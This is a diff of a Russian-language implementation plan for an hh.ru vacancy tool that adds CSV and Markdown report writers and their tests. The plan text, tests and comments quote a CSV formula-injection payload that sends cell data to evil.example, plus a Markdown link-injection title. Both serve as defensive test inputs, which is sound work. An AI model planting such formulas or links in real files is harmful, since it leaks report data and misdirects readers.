+
+**Четыре решения по формату, каждое — следствие факта, а не вкуса.**
+
+1. **CSV: `utf-8-sig` и `delimiter=";"`.** Без BOM Excel читает UTF-8 как cp1251 и
+   показывает `ÐžÐžÐž`; с русской локалью разделителем списка является `;`, и файл с
+   запятыми целиком ложится в первую колонку. BOM при этом пишется **ровно один раз за
+   файл**: кодек `utf-8-sig` добавляет его при каждом открытии, поэтому второй прогон дня
+   должен открывать файл как `utf-8`.
+2. **CSV: обезвреживание формул.** Заголовок и название компании пишет работодатель, то
+   есть это внешний недоверенный текст. Значение вида
+   `=HYPERLINK("http://evil.example/?u="&A1;"вакансия")` Excel исполнит, а вполне обычный
+   заголовок `+7 (999) 123-45-67 — Embedded Linux` покажет как `#ИМЯ?`. Квотирование
+   модуля `csv` от этого не защищает — оно про разделители, а не про интерпретацию.
+   Лечение — префикс `'` для значений, начинающихся с `= + - @ \t \r`.
+3. **Markdown: экранирование.** `[Удалённо]` в начале названия на hh.ru встречается, а
+   `**[Ссылка ](https://evil.example) конец](https://hh.ru/vacancy/4)**` рендерится как
+   рабочая ссылка на чужой сайт. Экранируются `[ ] \` ` * _`, а переводы строк
+   схлопываются: пустая строка внутри пункта — это конец пункта для любого рендерера.
+4. **Формат даты задан явно.** Из хранилища даты приходят как aware UTC
+   (`storage/time_utils.py`), то есть `isoformat()` дал бы
+   `2026-07-27T11:48:48.366000+00:00` — с микросекундами, не читаемое человеком и не
+   распознаваемое Excel как дата. В отчёте `%Y-%m-%d %H:%M`, время — UTC, как в базе.
+   `published_at` при этом **необязателен** (листинг даты не отдаёт): неизвестная дата —
+   пустая ячейка, а не строка `None` и не падение.
+
+**Колонка `found_by_query` переименована в `listing`.** После переезда discovery в этом
+поле лежит slug листинга (`programmist`), а не текст поискового запроса; прежнее имя
+вводило бы в заблуждение читателя отчёта. Имя поля модели не меняется — оно фигурирует в
+хранилище и в задаче 10.
+
+**Неизвестное имя sink обязано ронять процесс на старте.** `build_sinks` для этого
+вызывается **до `start_run()`** и до первого сетевого запроса (требование спеки §7/§9) —
+это контракт для задачи 10. Проверять имена типом (`Literal["csv", "markdown"]` в
+`app.yaml`) не стали: список приёмников раздвоился бы между схемой конфига и фабрикой, а
+расширение через `Sink` — заявленная точка роста (спека §4.2).
 
 - [ ] **Step 1: Написать падающий тест**
 
@@ -2218,7 +2598,8 @@ git commit -m "feat: keyword-скоринг с насыщением и штра�
 
 ```python
 import csv
-from datetime import datetime
+import re
+from datetime import UTC, datetime
 from pathlib import Path
 
 import pytest
@@ -2231,25 +2612,41 @@ from hh_search.domain.models import (
     VacancyDetails,
 )
 from hh_search.sinks import build_sinks
-from hh_search.sinks.csv_sink import CsvSink
-from hh_search.sinks.markdown_sink import MarkdownSink
+from hh_search.sinks.csv_sink import COLUMNS, CsvSink
+from hh_search.sinks.markdown_sink import SNIPPET_LENGTH, MarkdownSink
 
-NOW = datetime(2026, 7, 27, 10, 0, 0)
+# Данные тестов повторяют то, что приходит из хранилища: даты — aware UTC с
+# микросекундами (`storage/time_utils.py`), а зарплата и дата публикации
+# могут отсутствовать честно (листинг их не отдаёт, а на странице вакансии
+# блока зарплаты может не быть вовсе).
+NOW = datetime(2026, 7, 27, 10, 0, tzinfo=UTC)
+PUBLISHED = datetime(2026, 7, 27, 6, 21, 20, 933000, tzinfo=UTC)
+SALARY = Salary(raw="от 200 000 ₽", amount_from=200000, currency="₽")
 
 
-def make_scored(vacancy_id: str, title: str, total: float, cluster: str) -> ScoredVacancy:
+def make_scored(
+    vacancy_id: str = "1",
+    title: str = "Embedded Engineer",
+    total: float = 87.4,
+    cluster: str = "embedded",
+    company: str | None = "ООО Ромашка",
+    area: str | None = "Нижний Новгород",
+    salary: Salary = SALARY,
+    published_at: datetime | None = PUBLISHED,
+    description: str = "Требуется опыт Yocto и BSP.",
+) -> ScoredVacancy:
     return ScoredVacancy(
         discovered=DiscoveredVacancy(
             id=vacancy_id,
             url=f"https://hh.ru/vacancy/{vacancy_id}",
             title=title,
-            company="ООО Ромашка",
-            area="Нижний Новгород",
-            salary=Salary(raw="от 200 000 руб.", amount_from=200000, currency="руб."),
-            published_at=NOW,
-            found_by_query="Yocto",
+            company=company,
+            area=area,
+            salary=salary,
+            published_at=published_at,
+            found_by_query="programmist",
         ),
-        details=VacancyDetails(description="Требуется опыт Yocto и BSP."),
+        details=VacancyDetails(description=description),
         score=ScoreBreakdown(
             title=1.0,
             stack=0.8,
@@ -2263,45 +2660,133 @@ def make_scored(vacancy_id: str, title: str, total: float, cluster: str) -> Scor
     )
 
 
-def test_csv_sink_writes_header_and_row(tmp_path: Path) -> None:
-    CsvSink(tmp_path).emit([make_scored("1", "Embedded Engineer", 87.4, "embedded")], NOW)
-    with (tmp_path / "2026-07-27-new.csv").open(encoding="utf-8") as handle:
-        rows = list(csv.DictReader(handle))
-    assert len(rows) == 1
-    assert rows[0]["id"] == "1"
-    assert rows[0]["score"] == "87.4"
-    assert rows[0]["url"] == "https://hh.ru/vacancy/1"
+def read_rows(path: Path) -> list[dict[str, str]]:
+    with path.open(encoding="utf-8-sig", newline="") as handle:
+        return list(csv.DictReader(handle, delimiter=";"))
 
 
-def test_csv_sink_appends_without_repeating_header(tmp_path: Path) -> None:
+# --- CSV: второго шанса не будет ------------------------------------------
+
+
+def test_csv_row_carries_every_column(tmp_path: Path) -> None:
+    """Сравнивается словарь ЦЕЛИКОМ, а не три поля из двенадцати.
+
+    После `mark_reported()` вакансия навсегда уходит из `unreported()`:
+    колонка, которую приёмник не записал, потеряна окончательно —
+    переотправки нет по построению (спека §5.2).
+    """
+    CsvSink(tmp_path).emit([make_scored()], NOW)
+    rows = read_rows(tmp_path / "2026-07-27-new.csv")
+    assert rows == [
+        {
+            "id": "1",
+            "score": "87.4",
+            "cluster": "embedded",
+            "title": "Embedded Engineer",
+            "company": "ООО Ромашка",
+            "area": "Нижний Новгород",
+            "salary_from": "200000",
+            "salary_to": "",
+            "currency": "₽",
+            "published_at": "2026-07-27 06:21",
+            "listing": "programmist",
+            "url": "https://hh.ru/vacancy/1",
+        }
+    ]
+
+
+def test_csv_opens_in_excel(tmp_path: Path) -> None:
+    """BOM и `;` — не вкус, а условие читаемости.
+
+    Без BOM Excel читает UTF-8 как cp1251 и показывает `ÐžÐžÐž`; с русской
+    локалью разделителем списка является `;`, и файл с запятыми целиком
+    ложится в первую колонку.
+    """
+    CsvSink(tmp_path).emit([make_scored()], NOW)
+    raw = (tmp_path / "2026-07-27-new.csv").read_bytes()
+    assert raw.startswith(b"\xef\xbb\xbf")
+    header = raw.decode("utf-8-sig").splitlines()[0]
+    assert header == ";".join(COLUMNS)
+
+
+def test_csv_appends_second_run_without_repeating_header_or_bom(tmp_path: Path) -> None:
+    """Второй прогон дня дописывает, а не начинает файл заново — и не
+    вставляет второй BOM: кодек utf-8-sig пишет его при каждом открытии."""
     sink = CsvSink(tmp_path)
-    sink.emit([make_scored("1", "A", 80.0, "embedded")], NOW)
-    sink.emit([make_scored("2", "B", 70.0, "backend")], NOW)
-    with (tmp_path / "2026-07-27-new.csv").open(encoding="utf-8") as handle:
-        rows = list(csv.DictReader(handle))
-    assert [row["id"] for row in rows] == ["1", "2"]
+    sink.emit([make_scored(vacancy_id="1")], NOW)
+    sink.emit([make_scored(vacancy_id="2")], NOW)
+    path = tmp_path / "2026-07-27-new.csv"
+    assert [row["id"] for row in read_rows(path)] == ["1", "2"]
+    assert path.read_text(encoding="utf-8-sig").count("\ufeff") == 0
+
+
+def test_csv_neutralizes_formula_written_by_the_employer(tmp_path: Path) -> None:
+    """Заголовок вакансии — внешний недоверенный текст: его пишет
+    работодатель. Квотирование модуля csv от формул не защищает."""
+    title = '=HYPERLINK("http://evil.example/?u="&A1;"вакансия")'
+    CsvSink(tmp_path).emit(
+        [make_scored(title=title, company="+7 (999) 123-45-67 — Embedded Linux")], NOW
+    )
+    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
+    assert row["title"] == f"'{title}"
+    assert row["company"] == "'+7 (999) 123-45-67 — Embedded Linux"
+
+
+def test_csv_leaves_unknown_date_and_salary_empty(tmp_path: Path) -> None:
+    """`published_at` необязателен, а блока зарплаты на странице может не
+    быть вовсе. В отчёте это пустые ячейки, а не строка `None` и не падение."""
+    CsvSink(tmp_path).emit([make_scored(published_at=None, salary=Salary())], NOW)
+    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
+    assert row["published_at"] == ""
+    assert (row["salary_from"], row["salary_to"], row["currency"]) == ("", "", "")
+
+
+# --- Markdown: порог меняет подробность, а не состав ----------------------
 
 
 def test_markdown_splits_top_and_rest_by_threshold(tmp_path: Path) -> None:
     MarkdownSink(tmp_path, threshold=60.0).emit(
         [
-            make_scored("1", "Хорошая вакансия", 87.4, "embedded"),
-            make_scored("2", "Так себе вакансия", 42.0, "backend"),
+            make_scored(vacancy_id="1", title="Хорошая вакансия", total=87.4),
+            make_scored(vacancy_id="2", title="Так себе вакансия", total=42.0, cluster="backend"),
         ],
         NOW,
     )
     text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
-    assert "## Топ" in text
-    assert "## Остальное" in text
     assert text.index("Хорошая вакансия") < text.index("## Остальное")
     assert text.index("## Остальное") < text.index("Так себе вакансия")
+
+
+def test_markdown_keeps_a_vacancy_exactly_at_the_threshold_in_top(tmp_path: Path) -> None:
+    """Спека §6.3 фиксирует `>=`: вакансия на пороге РОВНО идёт в «Топ».
+
+    Разница между `>` и `>=` — это ровно те вакансии, для которых порог и
+    подбирался, поэтому строгий знак был бы тихой потерей подробностей.
+    """
+    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(title="Ровно порог", total=60.0)], NOW)
+    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
+    assert text.index("Ровно порог") < text.index("## Остальное")
+    assert "_ничего выше порога_" not in text
+
+
+def test_markdown_orders_top_by_score_descending(tmp_path: Path) -> None:
+    """Внутри кластера — от лучшего к худшему: отчёт читают сверху."""
+    MarkdownSink(tmp_path, threshold=60.0).emit(
+        [
+            make_scored(vacancy_id="1", title="Похуже", total=70.0),
+            make_scored(vacancy_id="2", title="Получше", total=90.0),
+        ],
+        NOW,
+    )
+    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
+    assert text.index("Получше") < text.index("Похуже")
 
 
 def test_markdown_groups_top_by_cluster(tmp_path: Path) -> None:
     MarkdownSink(tmp_path, threshold=60.0).emit(
         [
-            make_scored("1", "Первая", 90.0, "embedded"),
-            make_scored("2", "Вторая", 80.0, "backend"),
+            make_scored(vacancy_id="1", title="Первая", total=90.0, cluster="embedded"),
+            make_scored(vacancy_id="2", title="Вторая", total=80.0, cluster="backend"),
         ],
         NOW,
     )
@@ -2309,6 +2794,71 @@ def test_markdown_groups_top_by_cluster(tmp_path: Path) -> None:
     assert "### embedded" in text
     assert "### backend" in text
     assert "https://hh.ru/vacancy/1" in text
+
+
+def test_markdown_full_entry_shows_company_area_and_salary(tmp_path: Path) -> None:
+    """Три поля, за которые заплачено запросом к странице вакансии. Без них
+    «Топ» приходится открывать по ссылке, чтобы понять, стоит ли открывать."""
+    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
+    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
+    assert "ООО Ромашка · Нижний Новгород · от 200 000 ₽" in text
+
+
+def test_markdown_says_the_salary_is_unknown_when_the_page_had_none(tmp_path: Path) -> None:
+    """Ветка достижима: блока `data-qa="vacancy-salary"` на странице может не
+    быть — это обычный случай, а не ошибка (спека §3.4)."""
+    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(salary=Salary(), area=None)], NOW)
+    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
+    assert "ООО Ромашка · — · зарплата не указана" in text
+
+
+def test_markdown_truncates_the_snippet(tmp_path: Path) -> None:
+    """Описание с hh.ru — это килобайты текста: без обрезки «Топ» перестаёт
+    быть выжимкой и читается дольше, чем сама страница вакансии."""
+    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(description="я" * 500)], NOW)
+    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
+    assert "я" * SNIPPET_LENGTH + "…" in text
+    assert "я" * (SNIPPET_LENGTH + 1) not in text
+
+
+def test_markdown_collapses_line_breaks_from_the_description(tmp_path: Path) -> None:
+    """Описание приходит со страницы многострочным (`html_to_text` ставит
+    переводы строк на месте блочных тегов). Пустая строка внутри пункта —
+    это конец пункта для любого рендерера markdown."""
+    MarkdownSink(tmp_path, threshold=60.0).emit(
+        [make_scored(description="Требуется опыт.\n\nYocto и BSP.")], NOW
+    )
+    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
+    assert "Требуется опыт. Yocto и BSP.…" in text
+
+
+def test_markdown_appends_the_second_run_of_the_day(tmp_path: Path) -> None:
+    """Прогон идёт раз в несколько часов: 'w' затирал бы утренние находки
+    вечерними, и вернуть их было бы нечем — `mark_reported` уводит вакансию
+    из `unreported()` навсегда."""
+    sink = MarkdownSink(tmp_path, threshold=60.0)
+    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW)
+    sink.emit([make_scored(vacancy_id="2", title="Вечерняя")], NOW.replace(hour=18))
+    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
+    assert text.count("# Новые вакансии") == 2
+    assert "Утренняя" in text
+    assert "Вечерняя" in text
+
+
+def test_markdown_escapes_link_syntax_from_the_employer(tmp_path: Path) -> None:
+    """Заголовок пишет работодатель, и `[Удалённо]` в его начале на hh.ru
+    встречается. Незакрытая скобка превращает пункт отчёта в рабочую ссылку
+    на чужой сайт."""
+    MarkdownSink(tmp_path, threshold=60.0).emit(
+        [make_scored(title="[Удалённо] Инженер](https://evil.example)")], NOW
+    )
+    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
+    assert r"\[Удалённо\]" in text
+    # Единственная настоящая ссылка в отчёте — на hh.ru.
+    assert re.findall(r"(?<!\\)\]\((http[^)]+)\)", text) == ["https://hh.ru/vacancy/1"]
+
+
+# --- фабрика и пустой вход ------------------------------------------------
 
 
 def test_sinks_do_nothing_on_empty_input(tmp_path: Path) -> None:
@@ -2322,15 +2872,19 @@ def test_build_sinks_resolves_names(tmp_path: Path) -> None:
     assert [sink.name for sink in sinks] == ["csv", "markdown"]
 
 
-def test_build_sinks_rejects_unknown_name(tmp_path: Path) -> None:
+def test_build_sinks_rejects_unknown_name_before_anything_is_written(tmp_path: Path) -> None:
+    """Опечатка в `sinks` обязана ронять процесс на старте, до сетевых
+    запросов (спека §7/§9), поэтому фабрика строится до `start_run()` и
+    отказывает, ничего не создав."""
     with pytest.raises(ValueError, match="telegram"):
-        build_sinks(["telegram"], tmp_path, threshold=60.0)
+        build_sinks(["csv", "telegram"], tmp_path, threshold=60.0)
+    assert list(tmp_path.iterdir()) == []
 ```
 
 - [ ] **Step 2: Запустить тест и убедиться, что он падает**
 
 Run: `uv run pytest tests/test_sinks.py -v`
-Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.sinks'`
+Expected: `ModuleNotFoundError: No module named 'hh_search.sinks'`, «1 error»
 
 - [ ] **Step 3: Реализовать `hh_search/sinks/base.py`**
 
@@ -2340,6 +2894,12 @@ from datetime import datetime
 from typing import Protocol
 
 from hh_search.domain.models import ScoredVacancy
+
+# Формат даты в отчётах: без микросекунд и без смещения. Из базы даты
+# приходят как aware UTC (`storage/time_utils.py`), то есть isoformat() дал
+# бы «2026-07-27T11:48:48.366000+00:00» — Excel такую строку числом не
+# считает, а человеку она нечитаема. Время в отчёте — UTC, как в базе.
+REPORT_DATE_FORMAT = "%Y-%m-%d %H:%M"
 
 
 class Sink(Protocol):
@@ -2359,14 +2919,53 @@ from datetime import datetime
 from pathlib import Path
 
 from hh_search.domain.models import ScoredVacancy
+from hh_search.sinks.base import REPORT_DATE_FORMAT
 
+# `listing`, а не `found_by_query`: после переезда discovery на листинги в
+# этом поле лежит slug (`programmist`), а не текст поискового запроса.
 COLUMNS = [
-    "id", "score", "cluster", "title", "company", "area",
-    "salary_from", "salary_to", "currency", "published_at", "found_by_query", "url",
+    "id",
+    "score",
+    "cluster",
+    "title",
+    "company",
+    "area",
+    "salary_from",
+    "salary_to",
+    "currency",
+    "published_at",
+    "listing",
+    "url",
 ]
+
+# Excel и LibreOffice исполняют содержимое ячейки, начинающееся с этих
+# символов. Заголовок и название компании пишет работодатель, то есть это
+# внешний недоверенный текст: `=HYPERLINK("http://evil/?u="&A1;"вакансия")`
+# в заголовке превращает отчёт в утечку. Квотирование модуля csv от формул
+# не защищает — оно про разделители, а не про интерпретацию.
+_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _cell(value: object) -> str:
+    """Значение ячейки: строка, обезвреженная от интерпретации формулой.
+
+    Апостроф перед значением — то, что понимают и Excel, и LibreOffice:
+    ячейка остаётся текстом. Числовые колонки этого не боятся (они
+    формируются нами и неотрицательны), но правило применяется ко всем,
+    чтобы не пришлось помнить, какая колонка внешняя.
+    """
+    text = "" if value is None else str(value)
+    return f"'{text}" if text.startswith(_FORMULA_STARTS) else text
 
 
 class CsvSink:
+    """Полная выгрузка нового: в CSV идёт всё, порога здесь нет (спека §6.3).
+
+    Формат подчинён единственному потребителю — таблице на рабочем столе:
+    UTF-8 с BOM и разделитель `;`, иначе русский текст в Excel читается как
+    `ÐžÐžÐž`, а с русской локалью вся строка ложится в одну колонку.
+    """
+
     name = "csv"
 
     def __init__(self, reports_dir: Path) -> None:
@@ -2377,34 +2976,46 @@ class CsvSink:
             return
         self._reports_dir.mkdir(parents=True, exist_ok=True)
         path = self._reports_dir / f"{now:%Y-%m-%d}-new.csv"
-        write_header = not path.exists()
-        with path.open("a", newline="", encoding="utf-8") as handle:
-            writer = csv.DictWriter(handle, fieldnames=COLUMNS)
-            if write_header:
+        first_write = not path.exists()
+        # BOM обязан быть ровно один: кодек utf-8-sig пишет его при каждом
+        # открытии файла, поэтому второй прогон того же дня вставил бы
+        # ещё один U+FEFF посреди данных.
+        encoding = "utf-8-sig" if first_write else "utf-8"
+        with path.open("a", newline="", encoding=encoding) as handle:
+            writer = csv.DictWriter(handle, fieldnames=COLUMNS, delimiter=";")
+            if first_write:
                 writer.writeheader()
             for item in vacancies:
-                discovered = item.discovered
-                writer.writerow(
-                    {
-                        "id": discovered.id,
-                        "score": item.score.total,
-                        "cluster": item.cluster,
-                        "title": discovered.title,
-                        "company": discovered.company or "",
-                        "area": discovered.area or "",
-                        "salary_from": discovered.salary.amount_from or "",
-                        "salary_to": discovered.salary.amount_to or "",
-                        "currency": discovered.salary.currency or "",
-                        "published_at": discovered.published_at.isoformat(),
-                        "found_by_query": discovered.found_by_query,
-                        "url": discovered.url,
-                    }
-                )
+                writer.writerow(self._row(item))
+
+    def _row(self, item: ScoredVacancy) -> dict[str, str]:
+        discovered = item.discovered
+        salary = discovered.salary
+        published_at = discovered.published_at
+        return {
+            "id": _cell(discovered.id),
+            "score": _cell(item.score.total),
+            "cluster": _cell(item.cluster),
+            "title": _cell(discovered.title),
+            "company": _cell(discovered.company),
+            "area": _cell(discovered.area),
+            "salary_from": _cell(salary.amount_from),
+            "salary_to": _cell(salary.amount_to),
+            "currency": _cell(salary.currency),
+            # Пустая ячейка, а не «None»: дата публикации неизвестна, пока
+            # вакансия не обогащена, и выдумывать её нечем (спека §5.3).
+            "published_at": _cell(
+                None if published_at is None else format(published_at, REPORT_DATE_FORMAT)
+            ),
+            "listing": _cell(discovered.found_by_query),
+            "url": _cell(discovered.url),
+        }
 ```
 
 - [ ] **Step 5: Реализовать `hh_search/sinks/markdown_sink.py`**
 
 ```python
+import re
 from collections.abc import Sequence
 from datetime import datetime
 from itertools import groupby
@@ -2414,8 +3025,36 @@ from hh_search.domain.models import ScoredVacancy
 
 SNIPPET_LENGTH = 200
 
+# Заголовок и описание пишет работодатель. `[Удалённо] Инженер` в начале
+# названия на hh.ru встречается, а `**[Ссылка](https://evil/) конец]
+# (https://hh.ru/vacancy/4)**` превращает пункт отчёта в рабочую ссылку на
+# чужой сайт. Экранируется то, что меняет структуру строки.
+_MARKDOWN_SPECIAL = re.compile(r"([\\`*_\[\]])")
+
+
+def _collapse(text: str) -> str:
+    """Одна строка вместо любого числа: перевод строки внутри пункта списка
+    ломает разметку не хуже скобки."""
+    return " ".join(text.split())
+
+
+def _escape(text: str) -> str:
+    return _MARKDOWN_SPECIAL.sub(r"\\\1", text)
+
+
+def _plain(text: str | None, fallback: str = "—") -> str:
+    return _escape(_collapse(text)) if text else fallback
+
 
 class MarkdownSink:
+    """Отчёт для чтения глазами: «Топ» по кластерам и свёрнутое «Остальное».
+
+    Порог ничего не прячет, он меняет подробность показа (спека §6.3):
+    вакансия на пороге РОВНО попадает в «Топ» (`>=`), а всё, что ниже, —
+    одной строкой. Раздел «Остальное» и есть обратная связь по качеству
+    скоринга, поэтому пустым он не остаётся молча.
+    """
+
     name = "markdown"
 
     def __init__(self, reports_dir: Path, threshold: float) -> None:
@@ -2433,41 +3072,58 @@ class MarkdownSink:
 
         lines = [f"# Новые вакансии — {now:%Y-%m-%d %H:%M}", "", "## Топ", ""]
         if top:
-            for cluster, group in groupby(sorted(top, key=lambda i: i.cluster), key=lambda i: i.cluster):
+            # Сортировка по кластеру устойчива, поэтому внутри кластера
+            # сохраняется порядок по убыванию балла из `ordered`.
+            for cluster, group in groupby(
+                sorted(top, key=lambda item: item.cluster), key=lambda item: item.cluster
+            ):
                 lines += [f"### {cluster}", ""]
                 lines += [self._full_entry(item) for item in group]
         else:
             lines += ["_ничего выше порога_", ""]
 
         lines += ["## Остальное", ""]
-        lines += (
-            [self._short_entry(item) for item in rest] if rest else ["_пусто_", ""]
-        )
+        lines += [self._short_entry(item) for item in rest] if rest else ["_пусто_", ""]
 
+        # Дописывание, а не перезапись: прогон идёт раз в несколько часов, и
+        # 'w' затирал бы утренние находки вечерними без следа — переотправки
+        # нет по построению, `mark_reported` уводит вакансию из `unreported`
+        # навсегда.
         with path.open("a", encoding="utf-8") as handle:
             handle.write("\n".join(lines).rstrip() + "\n\n")
 
     def _full_entry(self, item: ScoredVacancy) -> str:
         discovered = item.discovered
-        snippet = " ".join(item.details.description.split())[:SNIPPET_LENGTH]
+        snippet = _escape(_collapse(item.details.description)[:SNIPPET_LENGTH])
         return (
-            f"**[{discovered.title}]({discovered.url})** — {item.score.total:.0f}\n\n"
-            f"{discovered.company or '—'} · {discovered.area or '—'} · "
-            f"{discovered.salary.raw or 'зарплата не указана'}\n\n"
+            f"**[{_plain(discovered.title)}]({discovered.url})** — {item.score.total:.0f}\n\n"
+            f"{_plain(discovered.company)} · {_plain(discovered.area)} · "
+            f"{_plain(discovered.salary.raw, fallback='зарплата не указана')}\n\n"
             f"{snippet}…\n"
         )
 
     def _short_entry(self, item: ScoredVacancy) -> str:
         discovered = item.discovered
         return (
-            f"- [{discovered.title}]({discovered.url}) — {item.score.total:.0f} · "
-            f"{discovered.company or '—'}"
+            f"- [{_plain(discovered.title)}]({discovered.url}) — "
+            f"{item.score.total:.0f} · {_plain(discovered.company)}"
         )
 ```
 
 - [ ] **Step 6: Реализовать `hh_search/sinks/__init__.py`**
 
 ```python
+"""Приёмники отчётов и их фабрика.
+
+`build_sinks` вызывается ДО `start_run()` и до первого сетевого запроса
+(требование спеки §7/§9: опечатка роняет процесс на старте). Иначе
+неизвестное имя в `app.yaml` обнаруживается в середине прогона — когда за
+страницы уже заплачено запросами к hh.ru, а отчёт всё равно не выйдет.
+Проверять имена типом (`Literal["csv", "markdown"]` в конфиге) не стали:
+это раздвоило бы список приёмников между схемой конфига и этой фабрикой,
+а расширение через `Sink` — заявленная точка роста (спека §4.2).
+"""
+
 from collections.abc import Sequence
 from pathlib import Path
 
@@ -2490,10 +3146,11 @@ def build_sinks(names: Sequence[str], reports_dir: Path, threshold: float) -> li
     return sinks
 ```
 
-- [ ] **Step 7: Запустить тесты и убедиться, что они проходят**
+- [ ] **Step 7: Запустить все проверки**
 
-Run: `uv run pytest tests/test_sinks.py -v && uv run mypy hh_search`
-Expected: 7 passed
+Run: `uv run pytest tests/test_sinks.py -v && uv run pytest -q && uv run mypy hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/sinks tests/test_sinks.py`
+Expected: `18 passed`, затем `277 passed`, `Success: no issues found`, `All checks passed!`,
+`5 files already formatted`
 
 - [ ] **Step 8: Коммит**
 
@@ -2504,7 +3161,14 @@ git commit -m "feat: отчёты в CSV и Markdown
 Оба формата — реализации одного протокола Sink, к которому позже
 подключится Telegram без правок в конвейере. Markdown делится на
 Топ по кластерам и свёрнутое Остальное: порог ничего не прячет,
-он только меняет подробность показа."
+он только меняет подробность показа.
+
+Формат подчинён потребителю и внешним данным: BOM и разделитель ';'
+(иначе Excel показывает ÐžÐžÐž и одну колонку), префикс ' для значений,
+начинающихся с '=', '+', '-', '@' (заголовок пишет работодатель),
+экранирование markdown в заголовке и сниппете, явный формат даты
+вместо isoformat с микросекундами. Второй прогон дня дописывает
+отчёт, а не затирает: переотправки нет по построению."
 ```
 
 ---
